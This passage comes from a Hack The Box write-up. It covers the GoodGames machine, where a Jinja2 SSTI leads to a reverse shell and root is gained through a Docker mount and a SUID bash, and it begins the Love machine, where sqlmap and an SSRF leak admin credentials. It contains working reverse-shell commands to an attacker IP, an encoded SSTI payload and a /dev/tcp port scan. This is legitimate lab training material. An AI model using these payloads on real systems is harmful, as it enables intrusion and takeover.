However, when we attemp to use the string as password we don't success. So we introduce the string in the tool [Decodify](https://github.com/s0md3v/Decodify) and we get that is a MD5 hash:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126141541.png' | relative_url }}" text-align="center"/>
</div>

So we introduce admin@goodgames.htb:superadministrator as credentials and we gain access to a new area of the web: http://internal-administration.goodgames.htb/, so we add the domain to /etc/hosts and continue with the exploration:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126141853.png' | relative_url }}" text-align="center"/>
</div>


Then we are asked again about autentication but if we try again with the credentials admin:superadministrator we gain access:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126141947.png' | relative_url }}" text-align="center"/>
</div>

Exploring manually this new area we find some input fields but one notorius is the 'General Information' section on 'My Profile' because when we introduce data the outputs turns to be a template:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126142127.png' | relative_url }}" text-align="center"/>
</div>

Wappalyzer tell us that the framework that is being used is Flask, that use the well known template engine Jinja2.

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126142220.png' | relative_url }}" text-align="center"/>
</div>

So we get a request on BurpRepeater in order to Fuzz with some payloads until:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126142431.png' | relative_url }}" text-align="center"/>
</div>

We find that indeed is vulnerable to SSTi. Thus, we are going now achieve a foothoold on the system by using the following bash reverse shell script:

```bash
bash -i >& /dev/tcp/10.10.16.9/4444 0>&1
```

However, we can't send it as raw because it contains some spaces so we have to encoded it with base64:

```bash
echo 'bash -i >& /dev/tcp/10.10.16.9/4444 0>&1' | base64
```

Then, we are going to use the following Jinja2 syntax command (decocde using: echo "codedstring" \| base64 \| tr -d '\n'):

```
c2VsZi5fVGVtcGxhdGVSZWZlcmVuY2VfX2NvbnRleHQubmFtZXNwYWNlLl9faW5pdF9fLl9fZ2xvYmFsc19fLm9zLnBvcGVuKCc8Q09NTUFORD4nKS5yZWFkKCkK
```

and with the base64 encoded payload this will stand as the following (decode using: echo "codedstring" \| base64 \| tr -d '\n'):

````
e3tzZWxmLl9UZW1wbGF0ZVJlZmVyZW5jZV9fY29udGV4dC5uYW1lc3BhY2UuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ3t7c2VsZi5fVGVtcGxhdGVSZWZlcmVuY2VfX2NvbnRleHQubmFtZXNwYWNlLl9faW5pdF9fLl9fZ2xvYmFsc19fLm9zLnBvcGVuKCdlY2hvJHtJRlN9WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4Tmk0NUx6UTBORFFnTUQ0bU1Rbz0ke0lGU318YmFzZTY0JHtJRlN9LWR8YmFzaCcpLnJlYWQoKX19JykucmVhZCgpfX0gCg==
````

We have to note that the command in self is echoing, decoding the payload and then passing it to bash. Instead of an space we put '${IFS}'.

Then, as we are going to send this through a HTTP request we have to URL encoded it with the BurpDecoder:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126143609.png' | relative_url }}" text-align="center"/>
</div>

The payload in its totality previous to the send looks like follows:

```URL
%7b%7b%73%65%6c%66%2e%5f%54%65%6d%70%6c%61%74%65%52%65%66%65%72%65%6e%63%65%5f%5f%63%6f%6e%74%65%78%74%2e%6e%61%6d%65%73%70%61%63%65%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%2e%6f%73%2e%70%6f%70%65%6e%28%27%65%63%68%6f%24%7b%49%46%53%7d%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%69%34%35%4c%7a%51%30%4e%44%51%67%4d%44%34%6d%4d%51%6f%3d%24%7b%49%46%53%7d%7c%62%61%73%65%36%34%24%7b%49%46%53%7d%2d%64%7c%62%61%73%68%27%29%2e%72%65%61%64%28%29%7d%7d
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126143736.png' | relative_url }}" text-align="center"/>
</div>

And then, we gain a reverse shell:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126143755.png' | relative_url }}" text-align="center"/>
</div>

Briefly enumeration show  er are in a Docker Container:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126144004.png' | relative_url }}" text-align="center"/>
</div>

Further enumeration shows that exists a directory on /home called augustus that is owned y other UIP that root's:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126144220.png' | relative_url }}" text-align="center"/>
</div>

This is kind of strange since we are in a Docker container that only have the minimun to run an application. This could be a user's home directory mounted inside the docker container from the main system. This could be verified with the 
mount command:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126144424.png' | relative_url }}" text-align="center"/>
</div>

Indeed, we see that the user directory from the host is mounted with read/write flag enabled. For now this not seems to be useful so we continue to enumerating. 

We check the network information:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126144929.png' | relative_url }}" text-align="center"/>
</div>

We see that our net is a private net on 172.19.0.2. Because we are in a docker container, we know that usually the main system will have the 172.19.0.1 attached. We can perform a port scanning without nmap:

```bash
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```

The scan shows that the 22/tcp port is open so SSH is open:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126145907.png' | relative_url }}" text-align="center"/>
</div>

Then, we try to log to the machine with SSH recycling the 'superadministrator' password and we have success:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126150045.png' | relative_url }}" text-align="center"/>
</div>

Then, we can take advantage from the writing perms we have as root on the augustus's home directory mounted on the Docker container.

First, as augustus we copy the bash binary onto the /home/augustus directory:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126150756.png' | relative_url }}" text-align="center"/>
</div>

Then we exit and as root of the docker container we proceed to change the propierty and the perms of the filw in order to convert it in to a SUID file owned by root:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126150904.png' | relative_url }}" text-align="center"/>
</div>

Then, we log in again on the august ssh session and check the perms files:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126150939.png' | relative_url }}" text-align="center"/>
</div>

Then, we execute the file and we gain a root's session:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126151000.png' | relative_url }}" text-align="center"/>
</div>

### 8. Love - Windows (SSRF to an internal service via file_get_contents on PHP, ).

At first, we perform a Nmap scan and see that we have a HTTP/S, SMB, MySQL, and WinRM services on default ports (80, 443, 139, 445, 3309, 5985). 

First, we go to explore the web and we face an authentication portal:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221128092921.png' | relative_url }}" text-align="center"/>
</div>

Before try with some defaults credentials we desist and search for an [exploit](https://www.exploit-db.com/exploits/49445) but it requires some user son we go ahead and try a SQLi attack with sqlmap. We capture some random request and copy it into a file and use it on SQLmap

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221128093134.png' | relative_url }}" text-align="center"/>
</div>

<br />

```bash
sqlmap -r request -p- "voter, password" -batch
```

The output shows that the 'voter' parameter is vulnerable:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221128093256.png' | relative_url }}" text-align="center"/>
</div>

We see that the vulnerability is Time-Based and because this, the extraction of information is gonna be slow, so we try to see if other method of extraction is available with '--technique=BEUS' (Explication on machine 3) but we don't have luck. Although the efforts, we don't manage the retrieve some useful information.

After trying anonymous enumeration of the other services we re-explore the information available we see that the HTTPS server exposes a domain on the nmap scan at the ssl-cert field:


<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221128125336.png' | relative_url }}" text-align="center"/>
</div>

We can add the new domain to the /etc/hosts:

```bash
echo "10.10.10.239 www.love.htb staging.love.htb" > /etc/hosts
```

Visiting it, we found a file scanner:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221128125814.png' | relative_url }}" text-align="center"/>
</div>

This file scanner acts parsing the file and displays the output on the web page:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221128130648.png' | relative_url }}" text-align="center"/>
</div>

Because the code is incorporated in the same html page, it can't be performed by a Template Engine, we try to perform a reverse shell uploading a php shell because wappalyzer tell us that the page is PHP-based:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221128131151.png' | relative_url }}" text-align="center"/>
</div>

But we don't have luck either. In other way, this functionality could be vulnerable to a SSRF (Server-Side Request Forgery), we see that the service in port 5000 is unavailable:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221128133218.png' | relative_url }}" text-align="center"/>
</div>

But, maybe allow us to access it internaly by the functionality above:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221128133430.png' | relative_url }}" text-align="center"/>
</div>

The output display admins credentials: admin : @LoveIsInTheAir!!!!

